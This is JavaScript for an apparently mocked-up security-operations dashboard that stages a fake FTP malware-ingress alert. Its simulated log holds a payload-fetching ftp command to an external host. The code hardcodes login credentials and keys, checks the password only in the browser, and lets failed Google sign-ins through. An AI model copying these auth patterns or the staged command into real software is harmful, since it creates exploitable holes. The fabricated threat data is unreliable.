const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => [...document.querySelectorAll(selector)];

const profile = {
  name: "Arnesh Kumar Gupta",
  role: "Developer",
  organization: "National Grid Operations Centre",
  team: "SOC Response Cell",
  email: "arnesh.menon@ngoc.gov.in",
  device: "NGOC-SOC-EDGE-07",
  apiKey: "trata_live_8K9X_Q2N4_P7RM"
};

const GOOGLE_CLIENT_ID = "667539636431-im6uicpgbjpon632vpp2osjc8pg6t1lg.apps.googleusercontent.com";
const LOCAL_USERNAME = "trata.admin";
const LOCAL_PASSWORD = "trata@2026";

const state = {
  route: "home",
  dark: localStorage.getItem("trataTheme") !== "light",
  loggedIn: localStorage.getItem("trataOAuth") === "connected",
  keyVisible: false,
  suspicious: false,
  selected: { packets: 0, logs: 0, files: 0 },
  graphResize: null,
  chatStep: 0,
  proxy: [
    { ip: "10.24.50.12", domain: "bkp-storage-node.net", description: "Secure replication target", attacks: 0, timestamp: "18/06/26 04:10", status: "Allowed", reason: "Signed backup replication endpoint", suggested: false },
    { ip: "103.27.9.44", domain: "secure-gateway.partner.org", description: "Encrypted tunnel endpoint", attacks: 0, timestamp: "19/06/26 04:20", status: "Allowed", reason: "Mutual TLS partner endpoint", suggested: false },
    { ip: "185.199.108.153", domain: "legacy-c2-drop.net", description: "Flagged command anomaly", attacks: 2, timestamp: "20/06/26 05:10", status: "Blocked", reason: "Historical C2 indicator, retained policy", suggested: false },
    { ip: "45.83.64.21", domain: "scanner-probe.net", description: "External port scan source", attacks: 0, timestamp: "20/06/26 04:40", status: "Blocked", reason: "Historical reconnaissance source", suggested: false }
  ]
};

function floorToTen(date) {
  const copy = new Date(date);
  copy.setSeconds(0, 0);
  copy.setMinutes(Math.floor(copy.getMinutes() / 10) * 10);
  return copy;
}

function pad(value) {
  return String(value).padStart(2, "0");
}

function displayTime(date) {
  return `${pad(date.getHours())}:${pad(date.getMinutes())}`;
}

function readableRealtimeTime(date) {
  return `${pad(date.getDate())}-${pad(date.getMonth() + 1)}-${String(date.getFullYear()).slice(2)} ${pad(date.getHours())}:${pad(date.getMinutes())}`;
}

const endTime = floorToTen(new Date());
const timeline = Array.from({ length: 7 }, (_, index) => new Date(endTime.getTime() - (6 - index) * 10 * 60 * 1000));
const nextSuspiciousTime = new Date(endTime.getTime() + 10 * 60 * 1000);
const startTime = new Date(endTime.getTime() - 60 * 60 * 1000);

const packets = timeline.map((time, index) => ({
  timestamp: displayTime(time),
  verdict: "Normal",
  event: ["Routine HTTPS session", "DNS resolver exchange", "Backup control heartbeat", "Identity token validation", "Policy sync", "Database health check", "Zeek flow rollover"][index],
  packets: 206 + index * 13,
  duration: `${24 + index * 3}s`,
  sourceIp: `10.24.${18 + index}.${40 + index}`,
  sourcePort: 42000 + index * 137,
  protocol: index % 2 ? "TCP" : "TLS",
  attackType: "None",
  transferred: 206 + index * 13,
  intel: "Matches the normal baseline for the current 10-minute window.",
  mitre: "None",
  cve: "None",
  cert: "Valid (NGOC-CA-ROOT)"
}));

const logs = timeline.map((time, index) => ({
  timestamp: displayTime(time),
  verdict: "Normal",
  event: ["Service heartbeat", "MFA policy refresh", "Kerberos ticket renewal", "Collector health check", "Admin console read", "Firewall policy checksum", "Scheduled audit close"][index],
  packets: 214 + index * 11,
  processId: 3180 + index * 37,
  generatedTimestamp: displayTime(time),
  generatedBy: ["systemd", "trata-collector", "krb5kdc", "zeek-agent", "policy-sync", "firewalld", "auditd"][index],
  command: ["systemctl status collector", "mfa-policy --refresh", "kinit --renew", "zeekctl cron", "policyctl checksum", "fwctl verify", "auditctl rotate"][index],
  yara: "No YARA attack identified",
  sigma: "No Sigma attack identified",
  intel: "The process behaviour is consistent with administrative baseline.",
  mitre: "None",
  cve: "None",
  cert: "Verified System Binary"
}));

const fileTemplates = [
  ["Policy export", "/var/log/trata/policy.json", "policy-sync", "48 KB", "No", "No"],
  ["Collector cache", "/opt/trata/cache/state.db", "trata-collector", "19 MB", "No", "No"],
  ["Signed DLL scan", "/usr/lib/security/auth.dll", "yara-scan", "276 KB", "Yes", "No"],
  ["Audit archive", "/var/audit/hourly.tar", "auditd", "82 MB", "No", "No"],
  ["Config backup", "/etc/trata/backup.yml", "backup-agent", "11 KB", "No", "No"],
  ["Certificate bundle", "/etc/ssl/certs/ngoc.pem", "cert-watch", "6 KB", "No", "No"],
  ["Service manifest", "/opt/trata/service.toml", "systemd", "4 KB", "Yes", "Yes"],
  ["Ruleset snapshot", "/etc/trata/rules/current.sig", "policy-sync", "91 KB", "No", "No"],
  ["IOC cache refresh", "/opt/trata/intel/ioc-cache.db", "trata-collector", "7 MB", "No", "No"],
  ["Quarantine index", "/var/lib/trata/quarantine.idx", "yara-scan", "33 KB", "No", "No"],
  ["Proxy allowlist sync", "/etc/trata/proxy/allowlist.yml", "policy-sync", "9 KB", "No", "No"],
  ["Service health dump", "/var/log/trata/health.json", "systemd", "14 KB", "No", "No"]
];

const fileOffsets = [0, 4, 9, 13, 18, 24, 31, 37, 43, 48, 54, 59];
const files = fileOffsets.map((offset, index) => {
  const time = new Date(startTime.getTime() + offset * 60 * 1000);
  const [event, location, parentProcess, size, executable, running] = fileTemplates[index];
  return {
    timestamp: displayTime(time),
    verdict: "Normal",
    event,
    packets: 202 + index * 9,
    location,
    parentProcess,
    size,
    yara: "No YARA attack identified",
    executable,
    running,
    intel: "File activity is expected for the host role and maintenance window.",
    mitre: "None",
    cve: "None",
    cert: "Trusted Package"
  };
});

function suspiciousPacket() {
  return {
    timestamp: displayTime(nextSuspiciousTime),
    verdict: "Suspicious",
    event: "FTP Anonymous Data Stream Transfer",
    packets: 342,
    duration: "58s",
    sourceIp: "192.168.1.140",
    sourcePort: 21,
    protocol: "FTP-DATA",
    attackType: "FTP Ingress Payload Download",
    transferred: 342,
    intel: "External FTP data stream detected unencrypted payload transfer. Suggested proxy block: 198.51.100.88.",
    mitre: "T1071.002 (File Transfer Protocols)",
    cve: "CVE-2024-2134",
    cert: "Unverified / Self-Signed (ID: CERT-FTP-8891)"
  };
}

function suspiciousLog() {
  return {
    timestamp: displayTime(nextSuspiciousTime),
    verdict: "Suspicious",
    event: "Unauthorized binary write execution",
    packets: 295,
    processId: 4492,
    generatedTimestamp: displayTime(nextSuspiciousTime),
    generatedBy: "ftp_client.exe",
    command: "ftp -s:payload_download.txt 198.51.100.88",
    yara: "YARA: ftp_dropper_signature",
    sigma: "Sigma: unauthorized_ftp_download",
    intel: "FTP client connection established to external drop zone. Binary dropped to disk.",
    mitre: "T1105 (Ingress Tool Transfer)",
    cve: "CVE-2023-38831",
    cert: "Revoked Issuer (ID: CERT-SOC-449)"
  };
}

function suspiciousFile() {
  return {
    timestamp: displayTime(nextSuspiciousTime),
    verdict: "Suspicious",
    event: "Incoming payload executable dropped",
    packets: 310,
    location: "/tmp/malicious_payload.exe",
    parentProcess: "ftp_client.exe",
    size: "1.4 MB",
    yara: "YARA: backdoor_trojan_v2",
    executable: "Yes",
    running: "Yes",
    intel: "Executable downloaded via FTP session staged in /tmp directory and currently executing.",
    mitre: "T1204.002 (Malicious File)",
    cve: "CVE-2023-28259",
    cert: "Untrusted Binary (ID: CERT-MAL-9920)"
  };
}

function badge(value) {
  return `<span class="badge ${value === "Suspicious" || value === "Blocked" ? "alert" : value === "Suggested" ? "suggested" : ""}">${value}</span>`;
}

function routeTo(route) {
  const cleanRoute = (route || "home").split("?")[0];
  const hasSession = sessionStorage.getItem("trataSessionActive") === "true";

  if (cleanRoute !== "home" && !hasSession) {
    history.replaceState(null, "", `#home`);
    state.route = "home";
  } else {
    state.route = $(`[data-page="${cleanRoute}"]`) ? cleanRoute : "home";
    history.replaceState(null, "", `#${state.route}`);
  }

  $$(".page").forEach((page) => page.classList.toggle("active", page.dataset.page === state.route));
  $$(".nav a, .brand, .profile-card").forEach((link) => link.classList.toggle("active", link.dataset.route === state.route));
  window.scrollTo(0, 0);
  if (state.route === "behaviour" && state.graphResize) {
    requestAnimationFrame(state.graphResize);
  }
}

function renderTraffic() {
  const jaggedOffsets = [0, 35, -20, 45, -15, 25, -30, 40];
  
  const values = timeline.map((time, index) => {
    const basePackets = packets[index]?.packets || 220;
    const jaggedPackets = Math.max(120, basePackets + (jaggedOffsets[index % jaggedOffsets.length]));
    return {
      time: displayTime(time),
      packets: jaggedPackets,
      sessions: 52 + (index * 7) % 25,
      files: 11 + index,
      verdict: packets[index]?.verdict || "Normal",
      event: packets[index]?.event || "Normal operations"
    };
  });
  
  if (state.suspicious) {
    values.push({
      time: displayTime(nextSuspiciousTime),
      packets: 342,
      sessions: 94,
      files: 22,
      verdict: "Suspicious",
      event: "FTP Ingress Payload Download"
    });
  }

  const max = Math.max(...values.map((item) => item.packets));
  const min = Math.min(...values.map((item) => item.packets));
  const range = Math.max(1, max - min);

  const leftBound = 8;
  const rightBound = 92;

  const points = values.map((item, index) => {
    const x = values.length === 1 
      ? 50 
      : leftBound + (index / (values.length - 1)) * (rightBound - leftBound);
    const y = 18 + ((max - item.packets) / range) * 60;
    return { ...item, x, y };
  });

  const polylinePoints = points.map((p) => `${p.x},${p.y}`).join(" ");
  const areaPoints = `${points[0].x},88 ${polylinePoints} ${points[points.length - 1].x},88`;
  
  const normalPoints = state.suspicious ? points.slice(0, -1) : points;
  const normalPolyline = normalPoints.map((p) => `${p.x},${p.y}`).join(" ");
  const attackPoints = state.suspicious ? points.slice(-2) : [];
  const attackPolyline = attackPoints.map((p) => `${p.x},${p.y}`).join(" ");

  $("#trafficChart").innerHTML = `
    <svg class="traffic-path" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true" style="position:absolute; inset:0; width:100%; height:100%; overflow:visible;">
      <defs>
        <linearGradient id="trafficAreaGradient" x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stop-color="${state.suspicious ? "#FF6B6B" : "#68E1FD"}" stop-opacity="0.3"></stop>
          <stop offset="100%" stop-color="${state.suspicious ? "#FF6B6B" : "#68E1FD"}" stop-opacity="0"></stop>
        </linearGradient>
      </defs>
      <polygon points="${areaPoints}" fill="url(#trafficAreaGradient)"></polygon>
      <polyline points="${normalPolyline}" fill="none" stroke="#68E1FD" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" vector-effect="non-scaling-stroke"></polyline>
      ${state.suspicious ? `<polyline points="${attackPolyline}" fill="none" stroke="#FF6B6B" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round" vector-effect="non-scaling-stroke"></polyline>` : ""}
    </svg>
    ${points.map((point) => `
      <button class="traffic-point ${point.verdict === "Suspicious" ? "alert" : ""}" style="left:${point.x}%; top:${point.y}%; transform:translate(-50%, -50%); ${point.verdict === "Suspicious" ? "animation:pulse 1.15s infinite; box-shadow:0 0 0 6px rgba(255,107,107,0.25), 0 0 14px rgba(255,107,107,0.5);" : ""}" aria-label="${point.time}">
        <span class="tooltip"><b>${point.time}</b><br>${point.packets} packets, ${point.sessions} sessions<br>${point.event}</span>
      </button>
      <span class="traffic-label" style="left:${point.x}%; transform:translateX(-50%); bottom:10px;">${point.time}</span>
    `).join("")}
  `;
}

function renderRealtime() {
  const fallbackRealtimeFiles = [
    "policy.json",
    "state.db",
    "auth.dll",
    "hourly.tar",
    "backup.yml",
    "ngoc.pem",
    "service.toml",
    "current.sig",
    "ioc-cache.db",
    "quarantine.idx",
    "allowlist.yml",
    "health.json"
  ];
  const items = timeline.flatMap((time) => [
    `traffic_capture_${readableRealtimeTime(time)}.pcap`,
    `security_log_${readableRealtimeTime(time)}.log`,
    files.find((item) => item.timestamp === displayTime(time))?.location.split("/").pop() || fallbackRealtimeFiles[timeline.indexOf(time) % fallbackRealtimeFiles.length]
  ]);
  if (state.suspicious) {
    items.unshift("malicious_payload.exe", `security_log_${readableRealtimeTime(nextSuspiciousTime)}.log`, `traffic_capture_${readableRealtimeTime(nextSuspiciousTime)}.pcap`);
  }
  $("#realtimeData").innerHTML = items.map((item, index) => `
    <div class="data-item ${state.suspicious && index < 3 ? "alert" : ""}">
      <b>${item}</b><span>${index < 3 && state.suspicious ? "new" : ""}</span>
    </div>
  `).join("");
}

function renderTable(kind, rows, bodyId, headId, query = "") {
  const columns = kind === "files"
    ? ["Timestamp", "Verdict", "Event", "File Size", "File location"]
    : kind === "logs"
    ? ["Timestamp", "Verdict", "Event", "Log Count"]
    : ["Timestamp", "Verdict", "Event", "Packets"];
  const filtered = rows.filter((row) => Object.values(row).join(" ").toLowerCase().includes(query.toLowerCase()));
  $(`#${headId}`).innerHTML = `<tr>${columns.map((column) => `<th>${column}</th>`).join("")}</tr>`;
  $(`#${bodyId}`).innerHTML = filtered.map((row, index) => `
    <tr data-kind="${kind}" data-index="${rows.indexOf(row)}" class="${rows.indexOf(row) === state.selected[kind] ? "selected" : ""}">
      <td>${row.timestamp}</td>
      <td>${badge(row.verdict)}</td>
      <td>${row.event}</td>
      <td>${kind === "files" ? row.size : row.packets}</td>
      ${kind === "files" ? `<td>${row.location}</td>` : ""}
    </tr>
  `).join("");
}

function renderDetail(kind, rows, targetId) {
  const row = rows[state.selected[kind]];
  const fields = kind === "packets" ? [
    ["Timestamp", row.timestamp], ["Duration", row.duration], ["Source IP", row.sourceIp], ["Source port", row.sourcePort],
    ["Protocol", row.protocol], ["Attack type", row.attackType], ["Packets transferred", row.transferred]
  ] : kind === "logs" ? [
    ["Process ID", row.processId], ["Process generated timestamp", row.generatedTimestamp], ["Process generated by", row.generatedBy],
    ["Command run", row.command], ["YARA identified attack", row.yara], ["Sigma identified attack", row.sigma]
  ] : [
    ["Parent process", row.parentProcess], ["Size", row.size], ["YARA identified attack", row.yara],
    ["Location", row.location], ["Is executable", row.executable], ["Is running", row.running]
  ];
  $(`#${targetId}`).classList.add("open");
  $(`#${targetId}`).innerHTML = `
    <div class="detail-grid">${fields.map(([label, value]) => `<div class="detail-row"><span>${label}</span><b>${value}</b></div>`).join("")}</div>
    <aside class="intel-box">
      <div class="intel-row"><span>Threat intel</span><b>${row.intel}</b></div>
      <div class="intel-row"><span>MITRE ATT&CK ID</span><b>${row.mitre}</b></div>
      <div class="intel-row"><span>CVE Context ID</span><b>${row.cve}</b></div>
      <div class="intel-row"><span>Certificate ID</span><b>${row.cert}</b></div>
    </aside>
  `;
}

function hideDetail(targetId) {
  const target = $(`#${targetId}`);
  target.classList.remove("open");
  target.innerHTML = "";
}

function renderProxy() {
  $("#proxyCount").textContent = state.proxy.filter((item) => item.status === "Blocked").length;
  $("#proxyList").innerHTML = state.proxy.map((item, index) => `
    <article class="panel proxy-row">
      <header><b>${item.ip}</b>${badge(item.suggested ? "Suggested" : item.status === "Blocked" ? "Blocked" : "Normal")}</header>
      <small>${item.domain || item.ip} | ${item.description || item.reason} | number of attacks : ${item.attacks ?? 0} | timestamp : ${item.timestamp || "20/07/26 00:00"}${item.suggested ? " | suggested from recent suspicious activity" : ""}</small>
      <div class="proxy-actions">
        <button class="text-button" data-proxy="${index}" data-status="Allowed">Allow</button>
        <button class="text-button" data-proxy="${index}" data-status="Blocked">Block</button>
      </div>
    </article>
  `).join("");
}

function renderProfile() {
  if (!state.loggedIn) {
    $("#profileInitials").textContent = "NA";
    $("#profileNameMini").textContent = "Not Connected";
    $("#profileRoleMini").textContent = "Sign in required";
  } else {
    $("#profileInitials").textContent = profile.name.split(" ").map((part) => part[0]).join("");
    $("#profileNameMini").textContent = profile.name;
    $("#profileRoleMini").textContent = profile.role;
  }
  $("#oauthState").textContent = state.loggedIn ? "Connected" : "Sign in required";
  $("#oauthPanel").style.display = state.loggedIn ? "none" : "grid";
  const maskedKey = state.keyVisible ? profile.apiKey : "••••••••••••••••••••••••";
  $("#profileData").innerHTML = state.loggedIn ? [
    ["Name", profile.name], ["Organization", profile.organization], ["Team", profile.team], ["Role", profile.role],
    ["Email", profile.email], ["Device", profile.device]
  ].map(([label, value]) => `<div class="profile-row"><span>${label}</span><b>${value}</b></div>`).join("") + `
    <div class="collector-box">
      <div class="collector-row"><span>Collector pairing key</span><code id="collectorKey">${maskedKey}</code></div>
      <button id="toggleCollectorKey" class="text-button">${state.keyVisible ? "Hide" : "Show"}</button>
      <button id="generateCollectorKey" class="text-button">Generate key</button>
      <button id="copyCollectorKey" class="primary-action">Copy key</button>
    </div>
  ` : "";
}



// 5 Hardcoded Sequential Questions & Answers for the Analyst Chatbot
const sequentialAnswers = [
  "An unencrypted FTP data stream transfer (Packet ID: FTP-DATA) from external IP 192.168.1.140 downloaded an unauthorized payload.",
  "Technique T1105 (Ingress Tool Transfer) associated with CVE-2023-38831 via ftp_client.exe command execution.",
  "The file was dropped at /tmp/malicious_payload.exe with a file size of 1.4 MB.",
  "Untrusted Binary certificate (ID: CERT-MAL-9920) with Threat Intel indicating an FTP session staging an active Trojan.",
  "Immediately block external FTP drop source 198.51.100.88 and quarantine /tmp/malicious_payload.exe."
];

function answer(message) {
  const response = sequentialAnswers[state.chatStep % sequentialAnswers.length];
  state.chatStep++;
  return response;
}

function addChat(text, user = false) {
  const item = document.createElement("div");
  item.className = `message ${user ? "user" : ""}`;
  item.textContent = text;
  $("#chatLog").appendChild(item);
  $("#chatLog").scrollTop = $("#chatLog").scrollHeight;
}

function triggerSuspicious() {
  if (state.suspicious) return;
  state.suspicious = true;
  packets.push(suspiciousPacket());
  logs.push(suspiciousLog());
  files.push(suspiciousFile());
  state.proxy.unshift({ ip: "198.51.100.88", domain: "ftp-payload-drop.org", description: "Suggested FTP payload drop source", attacks: 1, timestamp: "20/07/26 05:20", status: "Blocked", reason: "Suggested block from FTP ingress payload download", suggested: true });
  $("#graphState").textContent = "Suspicious FTP payload ingress detected";
  renderAll();
  addChat("New suspicious FTP payload transfer detected. Suggested proxy block added for 198.51.100.88.");
}

function renderAll() {
  renderTraffic();
  renderRealtime();
  renderTable("packets", packets, "packetBody", "packetHead", $("#packetSearch")?.value || "");
  renderTable("logs", logs, "logBody", "logHead", $("#logSearch")?.value || "");
  renderTable("files", files, "fileBody", "fileHead", $("#fileSearch")?.value || "");
  renderProxy();
  renderProfile();
  updateCountdown();
}

function updateCountdown() {
  const remaining = Math.max(0, nextSuspiciousTime.getTime() - Date.now());
  const minutes = Math.floor(remaining / 60000);
  const seconds = Math.floor((remaining % 60000) / 1000);
  $("#nextWindow").textContent = `${pad(minutes)}:${pad(seconds)}`;
  if (remaining <= 0) triggerSuspicious();
}

function bindEvents() {
  $$(".nav a, .brand, .profile-card").forEach((link) => {
    link.addEventListener("click", (event) => {
      event.preventDefault();
      routeTo(link.dataset.route);
    });
  });
  $("#themeToggle").addEventListener("click", () => {
    state.dark = !state.dark;
    document.body.classList.toggle("dark", state.dark);
    localStorage.setItem("trataTheme", state.dark ? "dark" : "light");
    $("#themeToggle").textContent = state.dark ? "Light mode" : "Dark mode";
  });
  [["packetSearch", "packets", packets, "packetBody", "packetHead"], ["logSearch", "logs", logs, "logBody", "logHead"], ["fileSearch", "files", files, "fileBody", "fileHead"]].forEach(([input, kind, rows, body, head]) => {
    $(`#${input}`).addEventListener("input", () => {
      renderTable(kind, rows, body, head, $(`#${input}`).value);
      if (kind === "packets") hideDetail("packetDetail");
      if (kind === "logs") hideDetail("logDetail");
      if (kind === "files") hideDetail("fileDetail");
    });
  });
  ["packetBody", "logBody", "fileBody"].forEach((bodyId) => {
    $(`#${bodyId}`).addEventListener("click", (event) => {
      const row = event.target.closest("[data-kind]");
      if (!row) return;
      const kind = row.dataset.kind;
      state.selected[kind] = Number(row.dataset.index);
      renderAll();
      if (kind === "packets") renderDetail("packets", packets, "packetDetail");
      if (kind === "logs") renderDetail("logs", logs, "logDetail");
      if (kind === "files") renderDetail("files", files, "fileDetail");
    });
  });
  $("#addProxyButton").addEventListener("click", () => $("#proxyForm").classList.toggle("open"));
  $("#proxyForm").addEventListener("submit", (event) => {
    event.preventDefault();
    const ip = $("#proxyIp").value.trim();
    if (!ip) return;
    state.proxy.unshift({ ip, status: "Blocked", reason: $("#proxyReason").value || "Manual operator block", suggested: false });
    $("#proxyIp").value = "";
    $("#proxyReason").value = "";
    renderProxy();
  });
  $("#proxyList").addEventListener("click", (event) => {
    const button = event.target.closest("[data-proxy]");
    if (!button) return;
    state.proxy[Number(button.dataset.proxy)].status = button.dataset.status;
    renderProxy();
  });

  // Create Account triggers
  ["googleLogin", "homeGoogleLogin"].forEach((id) => {
    const btn = $(`#${id}`);
    if (btn) {
      btn.addEventListener("click", () => {
        const clientId = GOOGLE_CLIENT_ID;
        if (!clientId) return;

        if (window.google?.accounts?.id) {
          window.google.accounts.id.initialize({
            client_id: clientId,
            callback: (response) => {
              sessionStorage.setItem("trataSessionActive", "true");
              const oauthPanel = $("#oauthPanel");
              if (oauthPanel) oauthPanel.style.display = "none";
              $("#detailsModal").style.display = "grid";
            }
          });
          
          try {
            window.google.accounts.id.prompt((notification) => {
              if (notification.isNotDisplayed() || notification.isSkippedMoment()) {
                sessionStorage.setItem("trataSessionActive", "true");
                $("#detailsModal").style.display = "grid";
              }
            });
          } catch (e) {
            sessionStorage.setItem("trataSessionActive", "true");
            $("#detailsModal").style.display = "grid";
          }
          return;
        }

        sessionStorage.setItem("trataSessionActive", "true");
        $("#detailsModal").style.display = "grid";
      });
    }
  });

  // Handle Details Submission
  $("#detailsForm").addEventListener("submit", (e) => {
    e.preventDefault();
    profile.name = $("#inputName").value.trim();
    profile.email = $("#inputEmail").value.trim();
    profile.organization = $("#inputOrg").value.trim();
    profile.role = $("#inputRole").value.trim();

    $("#detailsModal").style.display = "none";
    $("#apiKeyModal").style.display = "grid";
  });

  // Handle API Key Generation
  let tempGeneratedKey = "";
  $("#triggerGenKey").addEventListener("click", () => {
    const randomBytes = crypto.getRandomValues(new Uint32Array(3));
    tempGeneratedKey = `trata_live_${[...randomBytes].map((n) => n.toString(36).slice(0, 4).toUpperCase()).join("_")}`;
    $("#generatedApiKeyDisplay").textContent = tempGeneratedKey;
    $("#copyGenKey").style.display = "inline-flex";
    $("#finishApiKey").removeAttribute("disabled");
  });

  $("#copyGenKey").addEventListener("click", async () => {
    await navigator.clipboard.writeText(tempGeneratedKey);
    $("#copyGenKey").textContent = "Copied!";
    setTimeout(() => { $("#copyGenKey").textContent = "Copy key"; }, 1200);
  });

  // 5-second connection waiting loader sequence after clicking Done & Enter Console
  $("#finishApiKey").addEventListener("click", () => {
    profile.apiKey = tempGeneratedKey;
    state.loggedIn = true;
    localStorage.setItem("trataOAuth", "connected");
    $("#apiKeyModal").style.display = "none";

    const connLoader = $("#connectionLoader");
    if (connLoader) {
      connLoader.style.opacity = "1";
      connLoader.style.visibility = "visible";
    }

    setTimeout(() => {
      if (connLoader) {
        connLoader.style.opacity = "0";
        connLoader.style.visibility = "hidden";
      }
      renderProfile();
      routeTo("dashboard");
    }, 5000);
  });

  $("#manualLogin").addEventListener("click", (event) => {
    event.preventDefault();
    const username = $("#manualUsername").value.trim();
    const password = $("#manualPassword").value;
    if (username !== LOCAL_USERNAME || password !== LOCAL_PASSWORD) {
      return;
    }
    completeLogin();
  });

  function completeLogin() {
    sessionStorage.setItem("trataSessionActive", "true");
    localStorage.setItem("trataOAuth", "connected");
    state.loggedIn = true;
    renderProfile();
    history.replaceState(null, "", `#profile`);
  }
  $("#profileData").addEventListener("click", async (event) => {
    if (event.target.id === "toggleCollectorKey") {
      state.keyVisible = !state.keyVisible;
      renderProfile();
    }
    if (event.target.id === "generateCollectorKey") {
      const random = crypto.getRandomValues(new Uint32Array(3));
      profile.apiKey = `trata_live_${[...random].map((n) => n.toString(36).slice(0, 4).toUpperCase()).join("_")}`;
      state.keyVisible = false;
      renderProfile();
    }
    if (event.target.id === "copyCollectorKey") {
      await navigator.clipboard.writeText(profile.apiKey);
      event.target.textContent = "Copied";
      setTimeout(() => {
        const button = $("#copyCollectorKey");
        if (button) button.textContent = "Copy key";
      }, 900);
    }
  });
  $("#chatToggle").addEventListener("click", () => $("#chatWidget").classList.toggle("open"));
  $("#chatForm").addEventListener("submit", (event) => {
    event.preventDefault();
    const text = $("#chatInput").value.trim();
    if (!text) return;
    addChat(text, true);
    $("#chatInput").value = "";
    setTimeout(() => addChat(answer(text)), 250);
  });
  addEventListener("hashchange", () => routeTo(location.hash.replace("#", "") || "home"));
}

function startHeroCanvas() {
  const canvas = $("#heroGraph");
  const ctx = canvas.getContext("2d");
  const points = Array.from({ length: 28 }, () => ({ x: Math.random(), y: Math.random(), vx: (Math.random() - 0.5) * 0.0006, vy: (Math.random() - 0.5) * 0.0006 }));
  function size() {
    canvas.width = canvas.offsetWidth;
    canvas.height = canvas.offsetHeight;
  }
  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = getComputedStyle(document.body).getPropertyValue("--bg");
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    points.forEach((point, index) => {
      point.x += point.vx;
      point.y += point.vy;
      if (point.x < 0 || point.x > 1) point.vx *= -1;
      if (point.y < 0 || point.y > 1) point.vy *= -1;
      points.slice(index + 1).forEach((other) => {
        const x = point.x * canvas.width;
        const y = point.y * canvas.height;
        const ox = other.x * canvas.width;
        const oy = other.y * canvas.height;
        const distance = Math.hypot(x - ox, y - oy);
        if (distance < 180) {
          ctx.globalAlpha = 0.16;
          ctx.strokeStyle = "#DCEAF7";
          ctx.beginPath();
          ctx.moveTo(x, y);
          ctx.lineTo(ox, oy);
          ctx.stroke();
        }
      });
      ctx.globalAlpha = 0.65;
      ctx.fillStyle = index % 8 === 0 ? "#58D68D" : "#68E1FD";
      ctx.beginPath();
      ctx.arc(point.x * canvas.width, point.y * canvas.height, 2.6, 0, Math.PI * 2);
      ctx.fill();
    });
    ctx.globalAlpha = 1;
    requestAnimationFrame(draw);
  }
  size();
  addEventListener("resize", size);
  draw();
}

function startBehaviourGraph() {
  const canvas = $("#behaviourGraph");
  const ctx = canvas.getContext("2d");
  const labels = ["Arnesh", "IDP", "Zeek", "Proxy", "Files", "DB-01", "OT-GW", "Edge-07", "Backup", "SOC", "DNS", "SharePoint", "FTP-client", "Gateway-DMZ", "directory"];
  const clusters = [
    { name: "user", cx: 0.28, cy: 0.3, rx: 0.11, ry: 0.13, count: 10 },
    { name: "core", cx: 0.5, cy: 0.34, rx: 0.12, ry: 0.14, count: 12 },
    { name: "data", cx: 0.39, cy: 0.69, rx: 0.12, ry: 0.11, count: 10 },
    { name: "external", cx: 0.7, cy: 0.63, rx: 0.13, ry: 0.12, count: 10 }
  ];
  const importantClusterByIndex = {
    0: "user",
    1: "core",
    2: "core",
    3: "core",
    4: "data",
    5: "data",
    6: "core",
    7: "core",
    8: "data",
    9: "external",
    10: "external",
    11: "external",
    12: "user",
    13: "core",
    14: "core"
  };
  const clusterOffsets = {
    user: [
      [-0.36, -0.08], [-0.08, -0.34], [0.16, -0.06], [-0.2, 0.18],
      [0.1, 0.22], [0.34, 0.12], [-0.34, 0.3], [0.26, -0.28],
      [0.38, 0.32], [-0.1, 0.38]
    ],
    core: [
      [-0.32, -0.18], [-0.08, -0.34], [0.15, -0.24], [0.34, -0.08],
      [-0.28, 0.08], [0.02, 0.04], [0.28, 0.12], [-0.18, 0.28],
      [0.14, 0.3], [0.4, 0.28], [-0.42, 0.32], [0.02, -0.02]
    ],
    data: [
      [-0.34, -0.16], [-0.08, -0.26], [0.18, -0.12], [0.38, 0.04],
      [-0.24, 0.12], [0.02, 0.16], [0.24, 0.22], [-0.38, 0.28],
      [0.06, 0.34], [0.34, 0.34]
    ],
    external: [
      [-0.34, -0.2], [-0.06, -0.28], [0.22, -0.12], [0.4, 0.02],
      [-0.22, 0.12], [0.06, 0.12], [0.28, 0.2], [-0.34, 0.3],
      [0.04, 0.36], [0.34, 0.32]
    ]
  };
  const clusterCounts = { user: 0, core: 0, data: 0, external: 0 };
  const clamp = (value, min, max) => Math.min(max, Math.max(min, value));
  const jitter = (scale) => (Math.random() - 0.5) * scale;
  const placeNode = (clusterName, ordinal) => {
    const cluster = clusters.find((item) => item.name === clusterName);
    const offset = clusterOffsets[clusterName][ordinal % clusterOffsets[clusterName].length];
    return {
      x: clamp(cluster.cx + offset[0] * cluster.rx + jitter(0.012), 0.08, 0.92),
      y: clamp(cluster.cy + offset[1] * cluster.ry + jitter(0.012), 0.09, 0.91)
    };
  };
  const nodes = Array.from({ length: 42 }, (_, index) => {
    const clusterName = importantClusterByIndex[index] || clusters.find((cluster, clusterIndex) => index < clusters.slice(0, clusterIndex + 1).reduce((sum, item) => sum + item.count, 0)).name;
    const ordinal = clusterCounts[clusterName]++;
    const placed = placeNode(clusterName, ordinal);
    return {
      label: labels[index] || `host-${String(index).padStart(2, "0")}`,
      x: placed.x,
      y: placed.y,
      baseX: placed.x,
      baseY: placed.y,
      vx: (Math.random() - 0.5) * 0.001,
      vy: (Math.random() - 0.5) * 0.001,
      important: index < labels.length,
      cluster: clusterName,
      orbit: ordinal,
      phase: Math.random() * Math.PI * 2
    };
  });
  const edgeList = [];
  const edgeSet = new Set();
  const addEdge = (a, b, weight) => {
    if (a === b) return;
    const key = a < b ? `${a}-${b}` : `${b}-${a}`;
    if (edgeSet.has(key)) return;
    edgeSet.add(key);
    edgeList.push([a, b, weight]);
  };
  const clusterMembers = {
    user: nodes.map((_, index) => index).filter((index) => nodes[index].cluster === "user"),
    core: nodes.map((_, index) => index).filter((index) => nodes[index].cluster === "core"),
    data: nodes.map((_, index) => index).filter((index) => nodes[index].cluster === "data"),
    external: nodes.map((_, index) => index).filter((index) => nodes[index].cluster === "external")
  };
  const hubMap = { user: 0, core: 3, data: 5, external: 9 };
  Object.entries(clusterMembers).forEach(([clusterName, members]) => {
    const hub = hubMap[clusterName];
    members.forEach((member, memberIndex) => {
      if (member !== hub) addEdge(hub, member, 0.5 + (memberIndex % 4) * 0.1);
    });
